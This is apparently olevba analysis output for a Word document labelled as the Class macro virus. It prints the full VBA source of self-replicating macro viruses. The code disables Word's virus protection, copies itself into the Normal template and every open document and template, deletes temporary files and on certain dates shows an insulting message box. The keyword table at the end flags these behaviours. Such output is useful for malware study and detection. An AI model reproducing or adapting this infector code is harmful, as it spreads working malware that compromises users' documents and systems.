olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-07dac13c525297dd53f01989070c67adbeafd447
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-07dac13c525297dd53f01989070c67adbeafd447 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'OPEY A.10/7/99 8:34:12 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
Sub AutoOpen()
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
On Error GoTo out
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
Options.VirusProtection = False
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
Options.SaveNormalPrompt = False
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
Options.ConfirmConversions = False
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
If nt > 70 And ad > 0 Then GoTo out
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
If nt < 70 Then
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
End If
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
host.CodeModule.AddFromFile ("c:\class.sys")
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
With host.CodeModule
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    For x = 1 To 4
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    .DeleteLines 1
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    Next x
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
End With
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
If nt < 70 Then
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    With host.CodeModule
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    .replaceline 1, "Sub AutoClose()"
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    .replaceline 71, "Sub ToolsMacro()"
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    End With
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
End If
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
With host.CodeModule
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    For x = 2 To 72 Step 2
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
    Next x
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
End With
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
out:
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
Sub ToolsMacro()
'OPEY A.10/7/99 8:34:13 PMEPSON Stylus COLOR 440 on \\DENDOMAIN\EPSONSTYBhagsClippit
Sub viewvbcode()
'Neuro6/14/99 2:52:23 PMEpson LX-800 on LPT1:BhagsClippit
End Sub


Private Sub Document_Close()
On Error Resume Next
Kill "c:\footprint.$$?"
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Dim al As String
Dim adoc As Document
Dim atpl As Template
Dim CoL As Integer
ThisDocument.VBProject.VBComponents("ThisDocument").Export "c:\footprint.$$$"
Open "c:\footprint.$$$" For Input As #1
Open "c:\footprint.$$1" For Output As #2
Line Input #1, al
Line Input #1, al
Line Input #1, al
Line Input #1, al
While Not EOF(1)
    Line Input #1, al
    Print #2, al
Wend
Close 1
Close 2
For Each adoc In Documents
    adoc.Sections(1).Footers(wdHeaderFooterPrimary).Range.Text = adoc.FullName
    If Not adoc.CustomDocumentProperties("FootPrint1") Then
        adoc.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = adoc.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        adoc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
For Each atpl In Templates
    If Not atpl.CustomDocumentProperties("FootPrint1") Then
        atpl.CustomDocumentProperties.Add Name:="FootPrint1", LinkToContent:=False, Value:=True, Type:=msoPropertyTypeBoolean
        CoL = atpl.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, CoL
        atpl.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "c:\footprint.$$1"
    End If
Next
NormalTemplate.Save
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
